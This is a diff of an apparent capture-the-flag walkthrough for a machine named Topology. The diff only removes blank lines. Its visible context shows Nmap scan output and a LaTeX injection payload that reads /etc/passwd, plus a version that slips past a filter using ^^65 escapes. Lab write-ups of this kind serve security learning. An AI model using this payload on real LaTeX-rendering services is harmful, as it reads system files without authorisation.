@@ -33,7 +33,6 @@ Topology is an Easy Difficulty Linux machine that showcases a `LaTeX` web applic
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Wed Sep 20 19:35:52 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 topology.htb
 Nmap scan report for topology.htb (10.129.69.153)
 Host is up, received user-set (0.12s latency).
@@ -53,7 +52,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Wed Sep 20 19:36:34 2023 -- 1 IP address (1 host up) scanned in 42.57 seconds
 ```
 
@@ -299,10 +297,8 @@ man ascii|grep e
 ```
 
 ```bash
-
 # Original
 $ \lstinputlisting{/etc/passwd} $
-
 
 # Obfuscated
 $ \lst^^65nputl^^65st^^65ng{/etc/passwd} $
